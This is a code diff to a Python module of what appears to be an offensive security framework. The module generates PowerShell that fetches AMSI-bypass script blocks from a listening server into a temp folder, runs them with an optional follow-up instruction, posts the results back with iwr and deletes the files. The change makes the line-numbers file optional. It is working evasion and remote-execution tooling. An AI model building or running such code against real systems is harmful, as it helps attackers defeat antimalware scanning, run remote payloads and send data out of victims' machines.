@@ -82,7 +82,7 @@ class CustomModule(Module):
             "port": ["8082", "Port where the server is listening", True],
             "destination": ["$env:TMP\\amlo", "Directory containing the files", True],
             "filePath": [None, "Path to the bypass file", True],
-            "lineNumbers": [None, "Path to the file containing line numbers for blocks", True],
+            "lineNumbers": [None, "Path to the file containing line numbers for blocks", False],
             "instruction": [None, "Instruction to execute after bypassing AMSI", False]
         }
 
@@ -174,30 +174,36 @@ class CustomModule(Module):
         """ # Create a new directory and delete content if it existed
         
         auxLine = 0
-        with open(self.args["lineNumbers"], 'r') as metadata:
-            for index, lineNumber in enumerate(metadata, start=0):
-                lineNumber = lineNumber.strip()
-                try:
-                    lineNumber = int(lineNumber)
-                except ValueError:
-                    print_error(f"Invalid line number '{lineNumber}' in {self.args['lineNumbers']}.")
-                    return
-                
-                if len(lines) < lineNumber:
-                    print_error(f"The file {self.args['filePath']} does not have {lineNumber} lines.")
-                    return
+        if self.args["lineNumbers"]:
+            with open(self.args["lineNumbers"], 'r') as metadata:
+                for index, lineNumber in enumerate(metadata, start=0):
+                    lineNumber = lineNumber.strip()
+                    try:
+                        lineNumber = int(lineNumber)
+                    except ValueError:
+                        print_error(f"Invalid line number '{lineNumber}' in {self.args['lineNumbers']}.")
+                        return
+                    
+                    if len(lines) < lineNumber:
+                        print_error(f"The file {self.args['filePath']} does not have {lineNumber} lines.")
+                        return
 
-                command = ''.join(lines[auxLine:lineNumber])
+                    command = ''.join(lines[auxLine:lineNumber])
+                    BYPASS_BLOCKS.append(command)
+                    function += f'chargeFiles -sourceUri {sourceUri}block/{index} -destination {destination}\\part{index}\n'
+                    auxLine = lineNumber
+                
+            if auxLine < len(lines):
+                command = ''.join(lines[auxLine:])
                 BYPASS_BLOCKS.append(command)
+                index += 1
                 function += f'chargeFiles -sourceUri {sourceUri}block/{index} -destination {destination}\\part{index}\n'
-                auxLine = lineNumber
-                
-        if auxLine < len(lines):
-            command = ''.join(lines[auxLine:])
+        
+        else: # send script complete
+            command = ''.join(lines)
             BYPASS_BLOCKS.append(command)
-            index += 1
-            function += f'chargeFiles -sourceUri {sourceUri}block/{index} -destination {destination}\\part{index}\n'
-                
+            function += f'chargeFiles -sourceUri {sourceUri}block/0 -destination {destination}\\part0\n'
+
         function += f"$result = loader -directory {destination}\n"
         function += "$req = iwr -UseBasicParsing -Uri $sourceUri -Method POST -Body @{results=$result}\n" # Send result to server
         function += f"Remove-Item -Path {destination} -Recurse -Force\n" # Delete new directory and files
